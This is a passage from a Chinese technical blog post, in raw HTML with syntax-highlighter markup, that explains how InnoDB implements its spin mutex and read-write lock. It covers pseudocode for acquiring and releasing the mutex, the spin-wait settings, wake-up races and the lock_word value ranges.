class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-4\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-5\"><span class=\"crayon-v\">loop1</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-7\"><span class=\"crayon-v\">loop2</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*指示点1*/</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">mutex</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">lock_word</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SPIN_ROUNDS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-10\"><span class=\"crayon-h\">             </span><span class=\"crayon-e\">random </span><span class=\"crayon-e\">spin </span><span class=\"crayon-e\">using </span><span class=\"crayon-v\">ut_delay</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">spin </span><span class=\"crayon-e\">max </span><span class=\"crayon-e\">time </span><span class=\"crayon-e\">depend </span><span class=\"crayon-e\">on </span><span class=\"crayon-v\">SPIN_WAIT_DELAY</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-11\"><span class=\"crayon-h\">             </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-12\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-13\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SPIN_ROUNDS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">yield_cpu</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-15\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-16\"><span class=\"crayon-c\">/*指示点2*/</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-17\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">__sync_lock_test_and_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">mutex</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">lock_word</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">mutex </span><span class=\"crayon-v\">successfully</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-20\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-21\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SPIN_ROUNDS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-22\"><span class=\"crayon-h\">     </span><span class=\"crayon-st\">goto</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">loop2</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-23\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-24\"><span class=\"crayon-c\">/*指示点4*/</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-25\"><span class=\"crayon-e\">get </span><span class=\"crayon-e\">cell </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">sync </span><span class=\"crayon-t\">array</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">call </span><span class=\"crayon-e\">os_event_reset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">mutex</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">event</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-26\"><span class=\"crayon-v\">mutex</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">waiter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-27\"><span class=\"crayon-c\">/*指示点3*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-28\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">__sync_lock_test_and_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">mutex</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">lock_word</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">mutex </span><span class=\"crayon-v\">successfully</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">free </span><span class=\"crayon-v\">cell</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-32\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-33\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-34\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-35\"><span class=\"crayon-e\">sync </span><span class=\"crayon-t\">array</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">wait </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">os_event_wait</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">mutex</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">event</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-36\"><span class=\"crayon-st\">goto</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">loop1</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0050 seconds] -->\r\n<p>代码还是有点小复杂的。这里分析几点如下：<br>\n1. SPIN_ROUNDS控制了在放弃cpu时间片（yield_cpu）之前，一共进行多少次忙等，这个参数就是对外可配置的innodb_sync_spin_loops，而SPIN_WAIT_DELAY控制了每次忙等的时间，这个参数也就是对外可配置的innodb_spin_wait_delay。这两个参数一起决定了自旋的时间。Heikki Tuuri建议在单处理器的机器上调小spin的时间，在对称多处理器的机器上，可以适当调大。比较有意思的是innodb_spin_wait_delay的单位，这个是100MHZ的奔腾处理器处理1毫秒的时间，默认innodb_spin_wait_delay配置成6，表示最多在100MHZ的奔腾处理器上自旋6毫秒。由于现在cpu都是按照GHZ来计算的，所以按照默认配置自旋时间往往很短。此外，自旋不真是cpu傻傻的在那边100%的跑，在现代的cpu上，给自旋专门提供了一条指令，在笔者的测试环境下，这条指令是pause，查看Intel的文档，其对pause的解释是：不会发生用户态和内核态的切换，cpu在用户态自旋，因此不会发生上下文切换，同时这条指令不会消耗太多的能耗。。。所以那些说spin lock太浪费电的不攻自破了。。。另外，编译器也不会把ut_delay给优化掉，因为其里面估计修改了一个全局变量。<br>\n2. yield_cpu 操作在笔者的环境中，就是调用了pthread_yield函数，这个函数把放弃当前cpu的时间片，然后把当前线程放到cpu可执行队列的末尾。<br>\n3. 在指示点1后面的循环，没有采用原子操作读取数据，是因为，Heikki Tuuri认为由于原子操作在内存和cpu cache之间会产生过的数据交换，如果只是读本地的cache，可以减少总线的争用。即使本地读到脏的数据，也没关系，因为在跳出循环的指示点2，依然会再一次使用原子操作进行校验。<br>\n4. get cell这个操作是从sync array执行的，sync array详见辅助数据结构这一节，简单的说就是提供给监控线程使用的。<br>\n5. 注意一下，<code>os_event_reset</code>和<code>os_event_wait</code>这两个函数的调用位置，另外，有一点必须清楚，就是<code>os_event_set</code>（锁持有者释放所后会调用这个函数通知所有等待者）可能在这整段代码执行到任意位置出现，有可能出现在指示点4的位置，这样就构成了条件变量通知在条件变量等待之前，会造成无限等待。为了解决这个问题，才有了指示点3下面的代码，需要重新再次检测一下lock_word，另外，即使<code>os_event_set</code>发生在<code>os_event_reset</code>之后，有了这些代码，也能让当前线程提前拿到锁，不用执行后续<code>os_event_wait</code>的代码，一定程度上提高了效率。</p>\n<p>mutex_exit的伪代码就简单多了，如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39b4de32a620664915\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n__sync_lock_test_and_set(mutex-&gt;lock_word, 0);\r\n\r\n/* A problem: we assume that mutex_reset_lock word                                                                     \r\n        is a memory barrier, that is when we read the waiters                                                                  \r\n        field next, the read must be serialized in memory                                                                      \r\n        after the reset. A speculative processor might                                                                         \r\n        perform the read first, which could leave a waiting                                                                    \r\n        thread hanging indefinitely.                                                                                                                                                                                                                        \r\nOur current solution call every second                                                                                 \r\n        sync_arr_wake_threads_if_sema_free()                                                                                   \r\n        to wake up possible hanging threads if                                                                                 \r\n        they are missed in mutex_signal_object. */ \r\n\r\nif (mutex-&gt;waiter != 0) {\r\n     mutex-&gt;waiter = 0;\r\n     os_event_set(mutex-&gt;event);\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de32a620664915-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de32a620664915-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de32a620664915-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de32a620664915-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de32a620664915-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de32a620664915-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de32a620664915-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de32a620664915-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de32a620664915-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de32a620664915-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de32a620664915-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de32a620664915-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de32a620664915-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de32a620664915-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de32a620664915-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de32a620664915-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de32a620664915-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39b4de32a620664915-1\"><span class=\"crayon-e\">__sync_lock_test_and_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">mutex</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">lock_word</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de32a620664915-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de32a620664915-3\"><span class=\"crayon-c\">/* A problem: we assume that mutex_reset_lock word                                                                     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de32a620664915-4\"><span class=\"crayon-c\">        is a memory barrier, that is when we read the waiters                                                                  </span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de32a620664915-5\"><span class=\"crayon-c\">        field next, the read must be serialized in memory                                                                      </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de32a620664915-6\"><span class=\"crayon-c\">        after the reset. A speculative processor might                                                                         </span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de32a620664915-7\"><span class=\"crayon-c\">        perform the read first, which could leave a waiting                                                                    </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de32a620664915-8\"><span class=\"crayon-c\">        thread hanging indefinitely.                                                                                                                                                                                                                        </span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de32a620664915-9\"><span class=\"crayon-c\">Our current solution call every second                                                                                 </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de32a620664915-10\"><span class=\"crayon-c\">        sync_arr_wake_threads_if_sema_free()                                                                                   </span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de32a620664915-11\"><span class=\"crayon-c\">        to wake up possible hanging threads if                                                                                 </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de32a620664915-12\"><span class=\"crayon-c\">        they are missed in mutex_signal_object. */</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de32a620664915-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de32a620664915-14\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">mutex</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">waiter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de32a620664915-15\"><span class=\"crayon-h\">     </span><span class=\"crayon-v\">mutex</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">waiter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de32a620664915-16\"><span class=\"crayon-h\">     </span><span class=\"crayon-e\">os_event_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">mutex</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">event</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39b4de32a620664915-17\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p>1. waiter是ib_mutex_t中的一个变量，用来表示当前是否有线程在等待这个锁。整个代码逻辑很简单，就是先把lock_word设置为0，然后如果发现有等待者，就把所有等待者给唤醒。facebook的mark callaghan在2014年测试过，相比现在已经比较完善的pthread库，InnoDB自旋互斥锁只在并发量相对较低（小于256线程）和锁等待时间比较短的情况下有优势，在高并发且较长的锁等待时间情况下，退化比较严重，其中一个很重要的原因就是InnoDB自旋互斥锁在锁释放的时候需要唤醒所有等待者。由于<code>os_event_ret</code>底层通过pthread_cond_boardcast来通知所有的等待者，一种改进是把pthread_cond_boardcast改成pthread_cond_signal，即只唤醒一个线程，但Inaam Rana Mark测试后发现，如果只唤醒一个线程的话，在高并发的情况下，这个线程可能不会立刻被cpu调度到。。由此看来，似乎唤醒一个特定数量的等待者是一个比较好的选择。<br>\n2. 伪代码中的这段注释笔者估计加上去的，大意是由于编译器或者cpu的指令重排乱序执行，mutex-&gt;waiter这个变量的读取可能在发生在原子操作之前，从而导致一些无线等待的问题。然后还专门开了一个叫做<code>sync_arr_wake_threads_if_sema_free</code>的函数来做清理。这个函数是在后台线程<code>srv_error_monitor_thread</code>中做的，每隔1秒钟执行一次。在现代的cpu和编译器上，完全可以用内存屏障的技术来防止指令重排和乱序执行，这个函数可以被去掉，官方的意见貌似是，不要这么激进，万一其他地方还需要这个函数呢。。详见BUG #79477。</p>\n<p>总体来说，InnoDB自旋互斥锁的底层实现还是比较有意思的，非常适合学习研究。这套锁机制在现在完善的Pthread库和高达4GMHZ的cpu下，已经有点力不从心了，mark callaghan研究发现，在高负载的压力下，使用这套锁机制的InnoDB，大部分cpu时间都给了sys和usr，基本没有空闲，而pthread mutex在相同情况下，却有平均80%的空闲。同时，由于ib_mutex_t这个结构体体积比较庞大，当buffer pool比较大的时候，会发现锁占用了很多的内存。最后，从代码风格上来说，有不少代码没有解耦，如果需要把锁模块单独打成一个函数库，比较困难。<br>\n基于上述几个缺陷，MySQL 5.7及后续的版本中，对互斥锁进行了大量的重新，包括以下几点(WL#6044)：<br>\n1. 使用了C++中的类继承关系，系统互斥锁和InnoDB自己实现的自旋互斥锁都是一个父类的子类。<br>\n2. 由于bool pool的锁对性能要求比较高，因此使用静态继承（也就是模板）的方式来减少继承中虚指针造成的开销。<br>\n3. 保留旧的InnoDB自旋互斥锁，并实现了一种基于futex的锁。简单的说，futex锁与上述的原子操作类似，能减少用户态和内核态切换的开销，但同时保留类似mutex的使用方法，大大降低了程序编写的难度。</p>\n<h2 id=\"innodb读写锁\">InnoDB读写锁</h2>\n<p>与条件变量、互斥锁不同，InnoDB里面没有Pthread库的读写锁的包装，其完全依赖依赖于原子操作和InnoDB的条件变量，甚至都不需要依赖InnoDB的自旋互斥锁。此外，读写锁还实现了写操作的递归锁，即同一个线程可以多次获得写锁，但是同一个线程依然不能同时获得读锁和写锁。InnoDB读写锁的核心数据结构rw_lock_t中，并没有等待队列的信息，因此不能保证先到的请求一定会先进入临界区。这与系统互斥量用PTHREAD_MUTEX_ADAPTIVE_NP来初始化有异曲同工之妙。<br>\nInnoDB读写锁的核心实现在源文件sync0rw.cc和sync0rw.ic中，核心数据结构rw_lock_t定义在sync0rw.h中。使用方法与InnoDB自旋互斥锁很类似，只不过读请求和写请求要调用不同的函数。加读锁调用<code>rw_lock_s_lock</code>, 加写锁调用<code>rw_lock_x_lock</code>，释放读锁调用<code>rw_lock_s_unlock</code>, 释放写锁调用<code>rw_lock_x_unlock</code>，创建读写锁调用<code>rw_lock_create</code>，释放读写锁调用<code>rw_lock_free</code>。函数<code>rw_lock_x_lock_nowait</code>和<code>rw_lock_s_lock_nowait</code>表示，当加读写锁失败的时候，直接返回，而不是自旋等待。</p>\n<h3 id=\"核心机制\">核心机制</h3>\n<p>rw_lock_t中，核心的成员有以下几个：lock_word, event, waiters, wait_ex_event，writer_thread, recursive。<br>\n与InnoDB自旋互斥锁的lock_word不同，rw_lock_t中的lock_word是int 型，注意不是unsigned的，其取值范围是(-2<em>X_LOCK_DECR, X_LOCK_DECR]，其中X_LOCK_DECR为0x00100000，差不多100多W的一个数。在InnoDB自旋互斥锁互斥锁中，lock_word的取值范围只有0，1，因为这两个状态就能把互斥锁的所有状态都表示出来了，也就是说，只需要查看一下这个lock_word就能确定当前的线程是否能获得锁。rw_lock_t中的lock_word也扮演了相同的角色，只需要查看一下当前的lock_word落在哪个取值范围中，就确定当前线程能否获得锁。至于rw_lock_t中的lock_word是如何做到这一点的，这其实是InnoDB读写锁乃至InnoDB同步机制中最神奇的地方，下文我们会详细分析。<br>\nevent是一个InnoDB条件变量，当当前的锁已经被一个线程以写锁方式独占时，后续的读锁和写锁都等待在这个event上，当这个线程释放写锁时，等待在这个event上的所有读锁和写锁同时竞争。waiters这变量，与event一起用，当有等待者在等待时，这个变量被设置为1，否则为0，锁被释放的时候，需要通过这个变量来判断有没有等待者从而执行<code>os_event_set</code>。<br>\n与InnoDB自旋互斥锁不同，InnoDB读写锁还有wait_ex_event和recursive两个变量。wait_ex_event也是一个InnoDB条件变量，但是它用来等待第一个写锁（因为写请求可能会被先前的读请求堵住），当先前到达的读请求都读完了，就会通过这个event来唤醒这个写锁的请求。<br>\n由于InnoDB读写锁实现了写锁的递归，因此需要保存当前写锁被哪个线程占用了，后续可以通过这个值来判断是否是这个线程的写锁请求，如果是则加锁成功，否则失败，需要等待。线程的id就保存在writer_thread这个变量中。<br>\nrecursive是个bool变量，用来表示当前的读写锁是否支持递归写模式，在某些情况下，例如需要另外一个线程来释放这个读写锁（insert buffer需要这个功能）的时候，就不要开启递归模式了。</em></p>\n<p>接下来，我们来详细介绍一下lock_word的变化规则：<br>\n1. 当有一个读请求加锁成功时，lock_word原子递减1。<br>\n2. 当有一个写请求加锁成功时，lock_word原子递减X_LOCK_DECR。<br>\n3. 如果读写锁支持递归写，那么第一个递归写锁加锁成功时，lock_word依然原子递减X_LOCK_DECR，而后续的递归写锁加锁成功是，lock_word只是原子递减1。<br>\n在上述的变化规则约束下，lock_word会形成以下几个区间：<br>\n<em>lock_word == X_LOCK_DECR: 表示锁空闲，即当前没有线程获得了这个锁。<br>\n0 &lt; lock_word &lt; X_LOCK_DECR: 表示当前有X_LOCK_DECR – lock_word个读锁<br>\nlock_word == 0: 表示当前有一个写锁<br>\n-X_LOCK_DECR &lt; lock_word &lt; 0: 表示当前有-lock_word个读锁，他们还没完成，同时后面还有一个写锁在等待<br>\nlock_word &lt;= -X_LOCK_DECR: 表示当前处于递归锁模式，同一个线程加了2 – (lock_word + X_LOCK_DECR)次写锁。</em><br>\n另外，还可以得出以下结论<br>\n1. 由于lock_word的范围被限制（rw_lock_validate）在(-2X_LOCK_DECR, X_LOCK_DECR]中，结合上述规则，可以推断出，一个读写锁最多能加X_LOCK_DECR个读锁。在开启递归写锁的模式下，一个线程最多同时加X_LOCK_DECR+1个写锁。<br>\n2. 在读锁释放之前，lock_word一定处于(-X_LOCK_DECR, 0)U(0, X_LOCK_DECR)这个范围内。<br>\n3. 在写锁释放之前，lock_word一定处于(-2*X_LOCK_DECR, -X_LOCK_DECR]或者等于0这个范围内。<br>\n4. 只有在lock_word大于0的情况下才可以对它递减。有一个例外，就是同一个线程需要加递归写锁的时候，lock_word可以在小于0的情况下递减。</p>\n<p>接下来，举个读写锁加锁的例子，方便读者理解读写锁底层加锁的原理。假设有读写加锁请求按照以下顺序依次到达：R1-&gt;R2-&gt;W1-&gt;R3-&gt;W2-&gt;W3-&gt;R4，其中W2和W3是属于同一个线程的写加锁请求，其他所有读写请求均来自不同线程。初始化后，lock_word的值为X_LOCK_DECR（十进制值为1048576）。R1读加锁请求首先到，其发现lock_word大于0，表示可以加读锁，同时lock_word递减1，结果为1048575，R2读加锁请求接着来到，发现lock_word依然大于0，继续加读锁并递减lock_word，最终结果为1048574。注意，如果R1和R2几乎是同时到达，即使时序上是R1先请求，但是并不保证R1首先递减，有可能是R2首先拿到原子操作的执行权限。如果在R1或者R2释放锁之前，写加锁请求W1到来，他发现lock_word依旧大于0，于是递减X_LOCK_DECR，并把自己的线程id记录在writer_thread这个变量里，再检查lock_word的值（此时为-2），由于结果小于0，表示前面有未完成的读加锁请求，于是其等待在wait_ex_event这个条件变量上。后续的R3, W2, W3, 